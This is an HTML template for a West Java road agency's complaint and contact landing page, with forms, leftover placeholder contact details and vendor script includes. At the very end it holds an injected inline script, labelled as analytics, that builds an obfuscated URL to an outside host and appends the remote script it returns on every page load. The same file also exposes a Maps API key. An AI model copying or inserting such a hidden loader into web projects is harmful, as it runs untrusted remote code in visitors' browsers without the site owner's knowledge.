                                            <option value="6">UPTD-VI</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="col-md-12 col-sm-12">
                                    <div class="form-group bottom35">
                                        <label for="saran" class="d-none"></label>
                                        <input class="form-control" type="text" placeholder="Saran/Keluhan:" required
                                            id=saran>
                                    </div>
                                </div>
                                <div class="col-md-12 col-sm-12">
                                    <div class="form-group bottom35">
                                        <label for="lat" class="d-none"></label>
                                        <input class="form-control" type="text" placeholder="Latitude (-6.98765)"
                                            required id="lat">
                                    </div>
                                </div>
                                <div class="col-md-12 col-sm-12">
                                    <div class="form-group bottom35">
                                        <label for="lng" class="d-none"></label>
                                        <input class="form-control" type="text" placeholder="Longitude (107.10987)"
                                            required id="lng">
                                    </div>
                                </div>
                                <div class="col-md-12 col-sm-12">
                                    <div class="form-group bottom35">
                                        <label for="pilihFile">Poto kondisi jalan saat ini</label>
                                        <input type="file" class="form-control-file" id="pilihFile">
                                    </div>
                                </div>
                                <div class="col-md-12 col-sm-12">
                                    <div class="form-group bottom35">
                                        <div class="form-check text-left">
                                            <input class="form-check-input" checked type="checkbox" value=""
                                                id="statment">
                                            <label class="form-check-label" for="statment">
                                                Saya setuju dengan peraturan berlaku
                                            </label>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-sm-12">
                                    <button type="submit" class="button gradient-btn w-100">Kirim Pengaduan</button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                <div class="col-lg-6 d-none d-lg-block pl-lg-0 wow fadeInRight">
                    <div class=" image login-image h-100">
                        <img src="https://picsum.photos/750/680" alt="" class="h-100">
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- Main sign-up section ends -->
    <!-- Contact US -->
    <section id="stayconnect1" class="position-relative padding noshadow">
        <div class="container whitebox">
            <div class="widget py-5">
                <div class="row">
                    <div class="col-md-12 text-center wow fadeIn mt-n3" data-wow-delay="300ms">
                        <h2 class="heading bottom30 darkcolor font-light2 pt-1"><span class="font-normal">Kontak</span>
                            Kami
                            <span class="divider-center"></span>
                        </h2>
                        <div class="col-md-8 offset-md-2 bottom35">
                            <p>Apakah ada yang ingin kamu tanyakan kepada kami?</p>
                        </div>
                    </div>
                    <div class="col-md-6 col-sm-6 order-sm-2">
                        <div class="contact-meta px-2 text-center text-md-left">
                            <div class="heading-title">
                                <span class="defaultcolor mb-3">Agen DBMPR Provinsi Jawa Barat</span>
                                <h2 class="darkcolor font-normal mb-4">
                                    Kantor Pusat Kami <span class="d-none d-md-inline-block">Di Kota Bandung</span></h2>
                            </div>
                            <p class="bottom10">Alamat: Jl. Asia Afrika No.79, Braga, Kec. Sumur Bandung, Kota Bandung,
                                Jawa Barat 40111</p>
                            <p class="bottom10">0800 214 5252</p>
                            <p class="bottom10"><a href="mailto:polpo@traxagency.co.au">polpo@Example.co.au</a></p>
                            <p class="bottom10">Mon-Fri: 9am-5pm</p>
                            <ul class="social-icons mt-4 mb-4 mb-sm-0 wow fadeInUp" data-wow-delay="300ms">
                                <li><a href="javascript:void(0)"><i class="fab fa-facebook-f"></i> </a> </li>
                                <li><a href="javascript:void(0)"><i class="fab fa-twitter"></i> </a> </li>
                                <li><a href="javascript:void(0)"><i class="fab fa-linkedin-in"></i> </a> </li>
                                <li><a href="javascript:void(0)"><i class="fab fa-instagram"></i> </a> </li>
                                <li><a href="javascript:void(0)"><i class="fab fa-whatsapp"></i> </a> </li>
                                <li><a href="javascript:void(0)"><i class="far fa-envelope"></i> </a> </li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-6 col-sm-6">
                        <div class="heading-title  wow fadeInUp" data-wow-delay="300ms">
                            <form class="getin_form wow fadeInUp" data-wow-delay="400ms" onsubmit="return false;">
                                <div class="row px-2">
                                    <div class="col-md-12 col-sm-12" id="result1"></div>
                                    <div class="col-md-12 col-sm-12">
                                        <div class="form-group">
                                            <label for="name1" class="d-none"></label>
                                            <input class="form-control" id="name1" type="text" placeholder="Nama:"
                                                required name="userName">
                                        </div>
                                    </div>
                                    <div class="col-md-12 col-sm-12">
                                        <div class="form-group">
                                            <label for="email1" class="d-none"></label>
                                            <input class="form-control" type="email" id="email1" placeholder="Email:"
                                                name="email">
                                        </div>
                                    </div>
                                    <div class="col-md-12 col-sm-12">
                                        <div class="form-group">
                                            <label for="message1" class="d-none"></label>
                                            <textarea class="form-control" id="message1" placeholder="Pesan:" required
                                                name="message"></textarea>
                                        </div>
                                    </div>
                                    <div class="col-md-12 col-sm-12">
                                        <button type="submit" id="submit_btn1"
                                            class="button gradient-btn w-100">Kirim</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-lg-3 col-md-3">
                    <div class="widget text-center top60 w-100">
                        <div class="contact-box">
                            <span class="icon-contact defaultcolor"><i class="fas fa-mobile-alt"></i></span>
                            <p class="bottom0"><a href="tel:+14046000396">+14046000396</a></p>
                            <p class="d-block"><a href="tel:+43720778972">+43720778972</a></p>
                        </div>
                    </div>
                </div>
                <div class="col-lg-3 col-md-3">
                    <div class="widget text-center top60 w-100">
                        <div class="contact-box">
                            <span class="icon-contact defaultcolor"><i class="fas fa-map-marker-alt"></i></span>
                            <p class="bottom0">Jl. Asia Afrika No.79, Braga, Kec. Sumur Bandung, Kota Bandung, Jawa
                                Barat 40111 </p>
                        </div>
                    </div>
                </div>
                <div class="col-lg-3 col-md-3">
                    <div class="widget text-center top60 w-100">
                        <div class="contact-box">
                            <span class="icon-contact defaultcolor"><i class="far fa-envelope"></i></span>
                            <p class="bottom0"><a href="mailto:admin@website.com">admin@website.com</a></p>
                            <p class="d-block"><a href="mailto:email@website.com">email@website.com</a></p>
                        </div>
                    </div>
                </div>
                <div class="col-lg-3 col-md-3">
                    <div class="widget text-center top60 w-100">
                        <div class="contact-box">
                            <span class="icon-contact defaultcolor"><i class="far fa-clock"></i></span>
                            <p class="bottom15">UTC−05:00 <span class="d-block">UTC+01:00</span></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- Contact US ends -->
    <!-- map -->
    <div class="w-100">
        <div id="map" class="full-map"></div>
    </div>
    <!-- map end -->
    <!-- Stay Connected -->
    <section id="stayconnect" class="bglight position-relative">
        <div class="container">
            <div class="contactus-wrapp position-absolute shadow-equal">
                <div class="row">
                    <div class="col-md-12 col-sm-12">
                        <div class="heading-title wow fadeInUp text-center text-md-left" data-wow-delay="300ms">
                            <h3 class="darkcolor bottom20">Tetap Terhubung Dengan Kami</h3>
                        </div>
                    </div>
                    <div class="col-md-12 col-sm-12">
                        <form class="getin_form wow fadeInUp" data-wow-delay="400ms" onsubmit="return false;">
                            <div class="row">
                                <div class="col-md-12 col-sm-12" id="result"></div>
                                <div class="col-md-3 col-sm-6">
                                    <div class="form-group">
                                        <label for="userName" class="d-none"></label>
                                        <input class="form-control" type="text" placeholder="Nama Awal:" required
                                            id="userName" name="userName">
                                    </div>
                                </div>
                                <div class="col-md-3 col-sm-6">
                                    <div class="form-group">
                                        <label for="companyName" class="d-none"></label>
                                        <input class="form-control" type="tel" placeholder="Nama Perusahaan:"
                                            id="companyName" name="companyName">
                                    </div>
                                </div>
                                <div class="col-md-3 col-sm-6">
                                    <div class="form-group">
                                        <label for="email" class="d-none"></label>
                                        <input class="form-control" type="email" placeholder="Email:" required
                                            id="email" name="email">
                                    </div>
                                </div>
                                <div class="col-md-3 col-sm-6">
                                    <button type="submit" class="button gradient-btn w-100"
                                        id="submit_btn">Berlangganan</button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- Contact US ends -->
    <!--Site Footer Here-->
    <footer id="site-footer" class=" bgdark padding_top">
        <div class="container">
            <div class="row">
                <div class="col-lg-3 col-md-6 col-sm-6">
                    <div class="footer_panel padding_bottom_half bottom20">
                        <a href="index.html" class="footer_logo bottom25"><img src="{{ asset('assets/images/brand/text_putih.png') }}"
                                alt="trax"></a>
                        <p class="whitecolor bottom25">Aplikasi teman jabar merupakan teknologi monitoring pembangunan
                            yang dilakukan oleh Dinas Bina Marga dan Penataan Ruang Provinsi Jawa Barat </p>
                        <div class="d-table w-100 address-item whitecolor bottom25">
                            <span class="d-table-cell align-middle"><i class="fas fa-mobile-alt"></i></span>
                            <p class="d-table-cell align-middle bottom0">
                                021 - 222 - 346 <a class="d-block"
                                    href="mailto:web@support.com">dbmpr.jawabarat@support.com</a>
                            </p>
                        </div>
                        <ul class="social-icons white wow fadeInUp" data-wow-delay="300ms">
                            <li><a href="javascript:void(0)" class="facebook"><i class="fab fa-facebook-f"></i> </a>
                            </li>
                            <li><a href="javascript:void(0)" class="twitter"><i class="fab fa-twitter"></i> </a> </li>
                            <li><a href="javascript:void(0)" class="linkedin"><i class="fab fa-linkedin-in"></i> </a>
                            </li>
                            <li><a href="javascript:void(0)" class="insta"><i class="fab fa-instagram"></i> </a> </li>
                        </ul>
                    </div>
                </div>
                <div class="col-lg-3 col-md-6 col-sm-6">
                    <div class="footer_panel padding_bottom_half bottom20">
                        <h3 class="whitecolor bottom25">Berita Terbaru</h3>
                        <ul class="latest_news whitecolor">
                            <li> <a href="#.">Judul Berita terbaru pada web dbmpr ... </a> <span
                                    class="date defaultcolor">22 Sep
                                    2020</span> </li>
                            <li> <a href="#.">Berita kedua dari web dbmpr... </a> <span class="date defaultcolor">25
                                    Sep 2020</span> </li>
                            <li> <a href="#.">Ambil dari berita web dbmpr... </a> <span class="date defaultcolor">27 Sep
                                    2020</span> </li>
                        </ul>
                    </div>
                </div>
                <div class="col-lg-3 col-md-6 col-sm-6">
                    <div class="footer_panel padding_bottom_half bottom20 pl-0 pl-lg-5">
                        <h3 class="whitecolor bottom25">Navigasi</h3>
                        <ul class="links">
                            <li><a href="#home" class="pagescroll">Beranda</a></li>
                            <li><a href="#about" class="pagescroll scrollupto">Tentang Kami</a></li>
                            <li><a href="#portfolio" class="pagescroll">UPTD</a></li>
                            <li><a href="#ourfaq" class="pagescroll">Pengaduan</a></li>
                            <li><a href="#stayconnect1"" class=" pagescroll">Kontak</a></li>
                        </ul>
                    </div>
                </div>
                <div class="col-lg-3 col-md-6 col-sm-6">
                    <div class="footer_panel padding_bottom_half bottom20">
                        <h3 class="whitecolor bottom25">Layanan</h3>
                        <p class="whitecolor bottom25">Monitoring data pekerjaan DBMPR
                        </p>
                        <!-- <ul class="hours_links whitecolor">
                            <li><span>Monday-Saturday:</span> <span>8.00-18.00</span></li>
                            <li><span>Friday:</span> <span>09:00-21:00</span></li>
                            <li><span>Sunday:</span> <span>09:00-20:00</span></li>
                            <li><span>Calendar Events:</span> <span>24-Hour Shift</span></li>
                        </ul> -->
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <!--Footer ends-->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="{{ asset('assets/vendor/jquery/js/jquery-3.4.1.min.js') }}"></script>
    <!--Bootstrap Core-->
    <script src="{{ asset('assets/vendor/popper.js/js/popper.min.js') }}"></script>
    <script src="{{ asset('assets/vendor/bootstrap/js/bootstrap.min.js') }}"></script>
    <!--to view items on reach-->
    <script src="{{ asset('assets/vendor/_landing/extras/js/jquery.appear.js') }}"></script>
    <!--Owl Slider-->
    <script src="{{ asset('assets/vendor/_landing/owl-carousel/js/owl.carousel.min.js') }}"></script>
    <!--number counters-->
    <script src="{{ asset('assets/vendor/_landing/extras/js/jquery-countTo.js') }}"></script>
    <!--Parallax Background-->
    <script src="{{ asset('assets/vendor/_landing/extras/js/parallaxie.js') }}"></script>
    <!--Cubefolio Gallery-->
    <script src="{{ asset('assets/vendor/_landing/cubeportfolio/js/jquery.cubeportfolio.min.js') }}"></script>
    <!--Fancybox js-->
    <script src="{{ asset('assets/vendor/_landing/fancybox/js/jquery.fancybox.min.js') }}"></script>
    <!--Tooltip js-->
    <script src="{{ asset('assets/vendor/_landing/tooltipster/js/tooltipster.min.js') }}"></script>
    <!--wow js-->
    <script src="{{ asset('assets/vendor/_landing/extras/js/wow.js') }}"></script>
    <!--Revolution SLider-->
    <script src="{{ asset('assets/vendor/_landing/revolution/js/jquery.themepunch.tools.min.js') }}"></script>
    <script src="{{ asset('assets/vendor/_landing/revolution/js/jquery.themepunch.revolution.min.js') }}"></script>
    <!-- SLIDER REVOLUTION 5.0 EXTENSIONS -->
    <script src="{{ asset('assets/vendor/_landing/revolution/js/extensions/revolution.extension.actions.min.js') }}"></script>
    <script src="{{ asset('assets/vendor/_landing/revolution/js/extensions/revolution.extension.carousel.min.js') }}"></script>
    <script src="{{ asset('assets/vendor/_landing/revolution/js/extensions/revolution.extension.kenburn.min.js') }}"></script>
    <script src="{{ asset('assets/vendor/_landing/revolution/js/extensions/revolution.extension.layeranimation.min.js') }}"></script>
    <script src="{{ asset('assets/vendor/_landing/revolution/js/extensions/revolution.extension.migration.min.js') }}"></script>
    <script src="{{ asset('assets/vendor/_landing/revolution/js/extensions/revolution.extension.navigation.min.js') }}"></script>
    <script src="{{ asset('assets/vendor/_landing/revolution/js/extensions/revolution.extension.parallax.min.js') }}"></script>
    <script src="{{ asset('assets/vendor/_landing/revolution/js/extensions/revolution.extension.slideanims.min.js') }}"></script>
    <script src="{{ asset('assets/vendor/_landing/revolution/js/extensions/revolution.extension.video.min.js') }}"></script>
    <!--map js-->
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAgIfLQi8KTxTJahilcem6qHusV-V6XXjw"></script>
    <script src="{{ asset('assets/js/map.js') }}"></script>
    <!--custom functions and script-->
    <script src="{{ asset('assets/js/landing_script.js') }}"></script>
    <script
        type="text/javascript">if (self == top) { function netbro_cache_analytics(fn, callback) { setTimeout(function () { fn(); callback(); }, 0); } function sync(fn) { fn(); } function requestCfs() { var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://"); var idc_glo_r = Math.floor(Math.random() * 99999999999); var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXlkq%2by4vYTEFyQq5aGLUaH30IO6Qu3PBqP3RdChJW0LtGuNhkxYGDUQNCFRfrosxpruLUGVRMT2cf2TbcWHkKhyEvxwV4pOvRXvopKHn2MViMqYjLWGJLtc%2bjH07AQfI7ccwSIpWFwRK6G8MNIDPNksfdp62vdmzS3%2bnu2Qvqb4ZyA5JIBXZ3HCa5n%2fqHd%2b%2fNNnsHc%2f144HLqschfkmMQC%2bdNt0rA8ivwSdNVsn006aTTGcAZ%2btSpdP9PG9EO4z%2fUsgazvPYs%2bHaL5tqKH5CPcZ7zGr4ZjoYyYQCX9uahI2i7ODa5R0gtm6A70zKUorSgkYyBCL2dmjc65nAw6CW9rpDss3c79q9RC5MDpoS2zvtAxx1ial5HebJFN0iqbIgIkjFRKtb1aMNtJyljsuPI3ggje4FdbYOsYvKCCig7eEf%2fiEzWBNvdVG28SjZ0KqS7g8P1kcLOmt%2fNnrP8b3jszMDBED%2bhsjs85zcBsjRcunKKM2YqAgK3MguVa7P8nJv1f%2b%2bh7rRi0rs3IaU%2bzZWaArxy0FLA%2fxZg8j6S4efKI3Qp3NzmiaiD9OSLjZ%2fcgium1ur8AxeHFa0%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height; var bsa = document.createElement('script'); bsa.type = 'text/javascript'; bsa.async = true; bsa.src = url; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa); } netbro_cache_analytics(requestCfs, function () { }); };</script>
</body>

</html>